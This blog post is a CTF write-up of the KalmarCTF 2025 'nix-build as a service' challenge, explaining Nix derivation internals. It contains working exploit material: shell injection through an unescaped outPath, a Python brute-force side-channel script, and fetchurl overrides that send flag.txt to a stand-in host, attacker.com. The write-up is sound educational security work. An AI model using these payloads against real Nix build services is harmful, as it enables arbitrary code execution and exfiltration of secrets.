+++
title = "KalmarCTF 2025 Write-up: nix-build as a service"

[taxonomies]
tags = ["ctf", "ctf-writeup", "nix"]
+++

This is a write-up of the "nix-build as a service" challenge from KalmarCTF 2025,
a sequel to last year's ["Reproducible Pwning"][reproducible-pwning] challenge.
To get to the solution, we will take a peek behind the curtain into how Nix derivations
work internally.
<!-- more -->

## The Challenge

Let's begin by taking a look at the challenge.
We were provided with a [tarball][handout], containing a flake and a Rust web app,
and the following description, including some (very welcome) instructions for
running it locally:

> Reproducible pwning is back!
> This time we learned our lesson and instead of full SSH access you can
> only request building a derivation.
> Surely you won't be able to leak anything this time?
>
> The comments in the code could be rather helpful.
> Everyone gets their own instance for this challenge.
> \[...]
> To run the instance locally, unpack the handout and run `nix run .#qemu`.
> The spawned VM will give you root shell access, as well as bind the web UI
> at localhost:8080.

The tarball contains the following files:

```
.
├── base.nix
├── chall
│   ├── chall.sh
│   ├── default.nix
│   ├── flag.txt
│   ├── no-builtins.nix
│   ├── README.md
│   └── user-input.nix
├── flake.lock
├── flake.nix
└── ui
    ├── Cargo.lock
    ├── Cargo.toml
    ├── package.nix
    ├── src
    │   ├── main.rs
    │   └── state.rs
    ├── static
    │   ├── Iosevka-Regular.woff2
    │   ├── Iosevka.css
    │   └── main.css
    └── templates
        └── main.html
```

### Nix Code

Starting with `flake.nix` and `base.nix`, there isn't much to see there apart from configurations
for properly setting up the VM, but the nix configuration stands out because it disables
[import from derivation][ifd], which could restrict what we can do later:

```nix, hl_lines=4
{
  # ...
  nix.settings = {
    allow-import-from-derivation = false;
    experimental-features = [
      "flakes"
      "nix-command"
      "no-url-literals"
    ];
  };
  # ...
}
```

Continuing to the `chall/` directory, we find a `default.nix` file that builds a derivation:

```nix, hl_lines=9 11 21
let
  nixpkgs = builtins.fetchTarball {
    url = "https://github.com/NixOS/nixpkgs/archive/8532db2a88ba56de9188af72134d93e39fd825f3.tar.gz";
    sha256 = "sha256-tttEXgKimgbtPvxFl+Avos4P4lssIqxHhxpLbbvNekk=";
  };
  pkgs = import nixpkgs { };
  inherit (pkgs) lib;
  no-builtins = import ./no-builtins.nix;
  user-input = builtins.scopedImport no-builtins ./user-input.nix;
  # TODO: Make sure the user does not reference the flag
  user-drv = assert lib.isDerivation user-input; pkgs.hello // user-input;
in
pkgs.stdenvNoCC.mkDerivation {
  pname = "nixjail";
  version = "0.0.1";

  dontUnpack = true;

  # FIXME: The user should not be able to execute arbitrary code
  # Ref: https://github.com/NixOS/nixpkgs/blob/master/pkgs/stdenv/generic/make-derivation.nix
  nativeBuildInputs = [user-drv];

  installPhase = ''
    mkdir -p "$out"
    echo kalmarctf{not-this-flag} > "$out/flag"
  '';
}
```

As mentioned in the challenge description, the comments indeed give various pointers of
what we should do to get the flag.

One thing that I noticed immediately was the use of `builtins.scopedImport`.
Although I had never seen it before, the name seems pretty self explanatory, and after
a quick search it seems like [it is undocumented][scopedImport-undocumented].
In a nutshell, it makes the attributes passed to it available in the scope of the
imported file, shadowing any existing builtins.
The challenge used this to prevent the use of any builtins in `user-input.nix`,
as we can see in the aptly named `no-builtins.nix`:

```nix
# Forbid using any of the nix builtins
# Ref: https://nix.dev/manual/nix/2.18/language/builtins.html
{
  "__add" = throw "__add is not available";
  "__currentSystem" = throw "__currentSystem is not available";
  "__getAttr" = throw "__getAttr is not available";
  "__isPath" = throw "__isPath is not available";
  # (hidden for brevity)
  "__isList" = throw "__isList is not available";
  "__readDir" = throw "__readDir is not available";
  "__toXML" = throw "__toXML is not available";
  "fetchGit" = throw "fetchGit is not available";
}
```

I quickly checked if there were any builtins the challenge author had missed
and found two (`__convertHash` and `__warn`), but they were not very useful.

Fun fact: you might be wondering why some builtins are prefixed by underscores.
Apparently, most (all?) builtins available under `builtins` that are not in
the global scope directly, are [also available in the global scope but prefixed with `__`][nix-underscore-builtins].
Additionally, they can also be used for [overloading some operators][overloading-ops].
For example, when doing a multiplication (`a * b`), Nix actually runs `__mul a b`
(interestingly, this does not apply to sums with `+`).

Finally, the `chall/` directory also includes a `chall.sh` that is used to test
the solution (i.e., building the derivation) without having to go through the web app,
a `user-input.nix` that is effectively empty, containing only an empty attribute set,
and perhaps most importantly, a `flag.txt` that contains the flag we want to get.

It is pretty clear from these files that the goal of the challenge is to provide a
`user-input.nix` that leaks the contents of `flag.txt` whenever the derivation in
`default.nix` is built.

### Web App

The Rust web app (under `ui/`) is not very interesting since it's only used to interact
with the challenge, but introduces a peculiar limitation: only the last line of the
output of running `nix-build` is sent back to the user.

```rs, hl_lines=18
let output = Command::new("nix-build")
    .arg(workdir)
    .stdin(Stdio::null())
    .stdout(Stdio::piped())
    .stderr(Stdio::piped())
    .spawn()?
    .wait_with_output()
    .await?;

let log = if output.stdout.is_empty() {
    output.stderr
} else {
    output.stdout
};
let log = String::from_utf8_lossy(&log);
let last_line = log
    .lines()
    .last()
    .map(|s| s.to_string())
    .unwrap_or_default();

let _ = d.close();

Ok(Main {
    status: Some(output.status.success().into()),
    user_input,
    last_line,
    files,
})
```

### Handout Update

Halfway through the CTF, the handout was updated, nerfing the challenge a bit
by adding the following to `default.nix`:

```diff
>   buildPhase = ''
>     runHook preBuild
>     # TODO: Enable building
>     # "${user-drv}/bin/build"
>     runHook postBuild
>   '';
```

My solution requires this change, but the [intended solution](#intended-solution) that
we will take a look at in a bit does not.

## Investigating Attack Vectors

Now knowing the challenge a bit better, we start to think how we can leak the flag.
Briefly ignoring the limitation of not being allowed to use any builtins, there are two major ways.

Firstly, derivations in Nix are usually built in a sandbox without network access.
A notable exception are [Fixed-Output Derivations (FOD)][fod], of which the cryptographic
hash of the output is known in advance, and therefore can access the network to,
for example, download files.
They are commonly used in fetchers like `fetchurl` and `fetchFromGitHub`.
Using a FOD, we could perform a request to a URL we control, therefore sending the flag
our way, since the hash is naturally only checked _after_ the request is made.
A practical example of this would be:

```nix
fetchurl {
  url = "https://attacker.com/?${flag}";
  hash = "";
}
```

Another approach could be to instead take advantage of the web app by leaking
the flag directly or indirectly through the build log.
Unfortunately, the log only contains the last line, which makes this a lot more
difficult.
To leak the flag directly, we would need to throw an evaluation error in the line
above the flag, since Nix gives some context around the error:

```
error: assertion '((lib).isDerivation user-input)' failed
at /.../nix-build-aas/chall/default.nix:11:14:
    10|   # TODO: Make sure the user does not reference the flag
    11|   user-drv = assert lib.isDerivation user-input; pkgs.hello // user-input;
      |              ^
    12| in
```

This could, in theory, be achieved by writing a Nix file and then importing it, like so:

```nix
let
  nixpkgs = builtins.fetchTarball {
    url = "https://github.com/NixOS/nixpkgs/archive/8532db2a88ba56de9188af72134d93e39fd825f3.tar.gz";
    sha256 = "sha256-tttEXgKimgbtPvxFl+Avos4P4lssIqxHhxpLbbvNekk=";
  };
  pkgs = import nixpkgs {};

  nix-file = pkgs.writeText "test.nix" ''
    {
      a = assert false;
      # ${builtins.readFile ./flag.txt}
      "a";
    }
  '';
in {
  foo = (import nix-file).a;
}
```

Which outputs the flag in the last line when evaluated:

```hl_lines=6
error: assertion 'false' failed
at /nix/store/yl3309dvhllvff04kr6r00fbxv49xw7s-test.nix:2:7:
     1| {
     2|   a = assert false;
      |       ^
     3|   # kalmar{this-is-the-right-one}
```

However, in practice, this is not possible in the challenge because
`allow-import-from-derivation` is set to false in `nix.conf`, as previously mentioned.

Fortunately, there is still the possibility of changing the build output depending on
the flag, even if the flag is not directly visible.
This is what I ended up doing for my solution, as you will see briefly.

But first, let's take a step back and look at other limitations we still have to overcome.

### What is a Derivation?

Depends on who you ask.
Luckily for us, [`lib.isDerivation`][isDerivation] considers any attrset a derivation
as long as it has a `type` attribute with value `"derivation"`:

```nix
{
  isDerivation = value: value.type or null == "derivation";
}
```

Therefore, the first step in the solution is to pass that check in `default.nix`,
which can be done by simply providing `{ type = "derivation"; }` as input.
Great, the derivation now builds successfully!

```
❯ ./chall.sh
this derivation will be built:
  /nix/store/8m344nl285pcz79xyb1y4ngdxq8dsdcz-nixjail-0.0.1.drv
building '/nix/store/8m344nl285pcz79xyb1y4ngdxq8dsdcz-nixjail-0.0.1.drv'...
(hidden for brevity)
/nix/store/gwmr71zbzbaa3c1mmxz6ly2fpi1q7svr-nixjail-0.0.1
```

Okay, but really, what _is_ a derivation?

If you have ever contributed to [nixpkgs] before, you might be used to
`stdenv.mkDerivation`, or even language specific builders like `rustPlatform.buildRustPackage`.
However, all of these derive from the [`derivation` builtin][derivation], a function that
takes in an attrset and returns derivation (which, coincidently, is also an attrset).

In its most basic form, a derivation takes a name, a system type (e.g., `x86_64-linux`)
and a builder (i.e., a program to run when the derivation is build).
There are other optional attributes you can set, but these are the minimum requirements.

Let's fire up `nix repl` and see what happens when we evaluate a sample derivation.

```
Nix 2.24.12
Type :? for help.
nix-repl> my-drv = derivation { name = "test"; system = "x86_64-linux"; builder = "/bin/sh"; }

nix-repl> my-drv
«derivation /nix/store/y1s2fiq89v2h9vkb38w508ir20dwv6v2-test.drv»

nix-repl> my-drv.type
"derivation"

nix-repl> :p (my-drv // { type = ""; })
{
  all = [
    «derivation /nix/store/y1s2fiq89v2h9vkb38w508ir20dwv6v2-test.drv»
  ];
  builder = "/bin/sh";
  drvAttrs = {
    builder = "/bin/sh";
    name = "test";
    system = "x86_64-linux";
  };
  drvPath = "/nix/store/y1s2fiq89v2h9vkb38w508ir20dwv6v2-test.drv";
  name = "test";
  out = «repeated»;
  outPath = "/nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test";
  outputName = "out";
  system = "x86_64-linux";
  type = "";
}
```

Note: the repl does not print the contents of the underlying attrset of a derivation,
but if we trick it by changing the `type` to something else, we can peek into the
"internals" of a derivation.

We can notice that the resulting derivation contains most of the information we would expect
given what we provided, with some recursive attributes along the way (e.g., you can do `my-drv.out.out.out`
until infinity).
Most notably, it _created_ a file in my Nix store, describing the derivation:
```
❯ cat /nix/store/y1s2fiq89v2h9vkb38w508ir20dwv6v2-test.drv
Derive([("out","/nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test","","")],[],[],"x86_64-linux","/bin/sh",[],[("builder","/bin/sh"),("name","test"),("out","/nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test"),("system","x86_64-linux")])
```

It has, however, _not_ built it, since we have only evaluated it:
```
❯ ls /nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test
"/nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test": No such file or directory (os error 2)
```

This behaviour was something I could not reproduce without the `derivation` builtin.
My initial idea was to create a derivation by hand, without using any builtins,
and then have that, _somehow_, affect the build and leak the flag,
but I did not find a way for Nix to "regenerate" the `.drv` file from `drvAttrs`,
even if the hash matched the expected value.

### toString-ing

Remember the change to the challenge that added a `buildPhase` to the derivation?

```nix, hl_lines=6
{
  # ...
  buildPhase = ''
    runHook preBuild
    # TODO: Enable building
    # "${user-drv}/bin/build"
    runHook postBuild
  '';
  # ...
}
```

Intuitively, we know that converting a derivation to a string will result in the
store path, but how does Nix know to do that?
From what we have seen about the derivation, there is only one attribute containing
the store path, `outPath`, so it _must_ be that one, but how does Nix _know_?
Well, turns out it doesn't, it just converts any attrset containing `outPath` to
the value of that attribute, recursively.

```
nix-repl> toString my-drv
"/nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test"

nix-repl> toString (my-drv // { type = ""; })
"/nix/store/d62izaahds46siwr2b7k7q3gan6vw4p0-test"

nix-repl> toString { }

       error: cannot coerce a set to a string: { }

nix-repl> toString { type = "derivation"; }

       error: cannot coerce a set to a string: { type = "derivation"; }

nix-repl> toString { type = "derivation"; outPath = "foo"; }
"foo"

nix-repl> toString { outPath = "foo"; }
"foo"

nix-repl> toString { outPath = {}; }

       error: cannot coerce a set to a string: { }

nix-repl> toString { outPath = 1; }
"1"

nix-repl> toString { outPath = { outPath = "bar"; }; }
"bar"
```

This is actually [documented under the `toString` builtin][toString], I just had
never stumbled upon it before.

Using this, it is possible to execute arbitrary bash code during the build process,
since the contents of `outPath` are not escaped:

```nix, hl_lines=3
{
  type = "derivation";
  outPath = "\n cat ${./flag.txt} \n #";
}
```

If we build the derivation, we can see that we are indeed executing code:

```hl_lines=10
❯ ./chall.sh
this derivation will be built:
  /nix/store/ymcc7hmyvpi436v8323fqpxwsjh1m1l6-nixjail-0.0.1.drv
building '/nix/store/ymcc7hmyvpi436v8323fqpxwsjh1m1l6-nixjail-0.0.1.drv'...
Running phase: patchPhase
Running phase: updateAutotoolsGnuConfigScriptsPhase
Running phase: configurePhase
no configure script, doing nothing
Running phase: buildPhase
kalmar{this-is-the-right-one}
Running phase: installPhase
Running phase: fixupPhase
shrinking RPATHs of ELF executables and libraries in /nix/store/1r56knjxd9zw7680m6p6lg7hkdx2yz3g-nixjail-0.0.1
checking for references to /build/ in /nix/store/1r56knjxd9zw7680m6p6lg7hkdx2yz3g-nixjail-0.0.1...
patching script interpreter paths in /nix/store/1r56knjxd9zw7680m6p6lg7hkdx2yz3g-nixjail-0.0.1
/nix/store/1r56knjxd9zw7680m6p6lg7hkdx2yz3g-nixjail-0.0.1
```

However, recall that we can only see the last line of the log, so this just by itself won't
give us the flag.

## Side-channels

This is where side-channels come in!
Using the code-execution capabilities we just acquired, we can conditionally fail
the build, which is very much visible from the web app.
One example of this, is failing if the contents of `flag.txt` do not start with
a given string:

```nix
{
  type = "derivation";
  outPath = "\n[[ $(cat ${./flag.txt}) == kalmar{* ]]\n #";
}
```

This piece of bash code will succeed if the flag starts with `kalmar{`, allowing
us to retrieve the flag one character at a time with a simple Python script:

```py
from requests_toolbelt import sessions
import string

BASE_URL = "http://localhost:8080/" # change to remote
s = sessions.BaseUrlSession(base_url=BASE_URL)


def build_payload(flag_prefix):
    return f"""
    {{
        type = "derivation";
        outPath = "\n[[ $(cat ${{./flag.txt}}) == {flag_prefix}* ]]\n #";
    }}
    """


def test_prefix(flag_prefix):
    payload = build_payload(flag_prefix)
    res = s.post("/", data={"user_input": payload})
    return "cannot create symlink" in res.text


alphabet = string.ascii_letters + string.digits + "{}-_"
flag = "kalmar{"
while "}" not in flag:
    for letter in alphabet:
        if test_prefix(flag + letter):
            flag += letter
            print(flag)
            break
```

Note: an interesting part of the web app is that it doesn't pass
`--no-out-link` to `nix-build`, which makes the build always fail since
it does not have permissions to write the `result` symlink:

```
error: filesystem error: cannot create symlink: Permission denied [/nix/store/gwmr71zbzbaa3c1mmxz6ly2fpi1q7svr-nixjail-0.0.1] [/result.tmp-628-1405809681]
```

This is, however, still enough to differentiate between the two cases, since a build
failure returns something like:

```
       For full logs, run 'nix log /nix/store/dnlaqczp0yrff6nvgqnvykbyfjg566qd-nixjail-0.0.1.drv'.
```


After waiting about 20 minutes for the script to run (it was pretty slow, but we had time),
we got the whole flag! :tada:


## Intended Solution

After solving the challenge, I talked with the author [niko][@nrab@hachyderm.io], who
showed me the intended solution, which is arguably even more interesting and
actually takes advantage of `pkgs.hello` in `default.nix`, unlike my solution
which could work without it by making a slight modification.
More importantly, it works without the addition of the `buildPhase` nerf,
that is, it works with only adding the derivation to `nativeBuildInputs`.

Without further ado, this is the intended solution:

```nix
{
  type = "derivation";
  outputSpecified = 0 == 0; # equals to true, since that is blocked by no-builtins.nix
  __toString = self: (self.src.overrideAttrs {
    # force nix to re-download file
    outputHash = "";
    outputHashAlgo = "sha256";

    urls = [ "https://attacker.com" ];
    curlOptsList = [ "-F" "flag=@${./flag.txt}" ];
  });
}
```

Let's now figure out _why_ and how this works.

When a derivation is added to `nativeBuildInputs`, `mkDerivation` will
[call `lib.getDev` on it][mkDerivation-getDev] in order to get a store path suitable to
[add to `PATH`][mkDerivation-PATH].

Notably, [`lib.getDev`][getDev] is simply an alias to [`lib.getOutput "dev"`][getOutput],
which are defined as:

```nix
{
  # ...
  getOutput = output: pkg:
    if ! pkg ? outputSpecified || ! pkg.outputSpecified
      then pkg.${output} or pkg.out or pkg
      else pkg;
  # ...
  getDev = getOutput "dev";
  # ...
}
```

To put it simply, `lib.getOutput` returns `pkg.${output}`
if it exists, falling back to `pkg.out` and then to `pkg`.
However, we can force it to always return `pkg` by setting
`outputSpecified` to true in the attrset.

So, by setting `outputSpecified` we force the contents of
`outPath` to be added to `PATH` (since, as we've seen, `toString attrset`
returns `outPath` if it exists).
However, there is another way to control how an attrset is stringify-ed:
by the `__toString` attribute, which is [also documented][toString].
This attribute takes a function, which receives the attrset being
stringify-ed (i.e., itself) and expects a string to be returned.

This allows us to access the attributes in `pkgs.hello`, which conveniently
[includes a call][hello-fetchurl] to [`fetchurl`][fetchurl].
This is override-able through `overrideAttrs` to change the URL to one
that we control and to include the flag in the request,
which achieves the [first attack vector](#investigating-attack-vectors) I mentioned earlier.

Therefore, when the `nixjail` derivation is built, it triggers a
request containing the flag. Neat!

## Final Remarks

I'm really loving these Nix challenges in CTFs, since they teach me a lot
about the inner workings of Nix, nixpkgs and NixOS.
This time, I learnt a bit more about how mkDerivation works under the hood, refreshed
my mind on the plain `derivation` builtin, and discovered new ways to change
the output of `toString`.

Big kudos to [niko][@nrab@hachyderm.io] and [Kalmarunionen] for putting out
this awesome challenge and CTF!
I'm hoping to have more Nix challs next year as well :eyes:

[reproducible-pwning]: /blog/kalmarctf-writeup-reproducible-pwning
[handout]: https://github.com/kalmarunionenctf/kalmarctf/tree/main/2025/misc/nix-build-aas
[ifd]: https://nix.dev/manual/nix/2.24/language/import-from-derivation
[scopedImport-undocumented]: https://github.com/NixOS/nix/issues/1450
[nix-underscore-builtins]: https://discourse.nixos.org/t/readfile-vs-builtins-readfile/12355/3
[overloading-ops]: https://github.com/NixOS/nix/issues/7290#issuecomment-1546846723
[fod]: https://nix.dev/manual/nix/2.24/language/advanced-attributes.html#adv-attr-outputHash
[isDerivation]: https://github.com/NixOS/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/lib/attrsets.nix#L1250-L1282
[nixpkgs]: https://github.com/NixOS/nixpkgs
[derivation]: https://nix.dev/manual/nix/2.24/language/derivations.html
[toString]: https://nix.dev/manual/nix/2.24/language/builtins#builtins-toString
[mkDerivation-getDev]: https://github.com/NixOS/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/pkgs/stdenv/generic/make-derivation.nix#L346
[mkDerivation-PATH]: https://github.com/NixOS/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/pkgs/stdenv/generic/setup.sh#L819
[getDev]: https://github.com/NixOS/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/lib/attrsets.nix#L1933-L1960
[getOutput]: https://github.com/NixOS/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/lib/attrsets.nix#L1763-L1799
[hello-fetchurl]: https://github.com/NixOS/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/pkgs/by-name/he/hello/package.nix#L16-L19
[fetchurl]: https://github.com/nixos/nixpkgs/blob/8532db2a88ba56de9188af72134d93e39fd825f3/pkgs/build-support/fetchurl/default.nix
[@nrab@hachyderm.io]: https://hachyderm.io/@nrab
[Kalmarunionen]: https://www.kalmarunionen.dk/
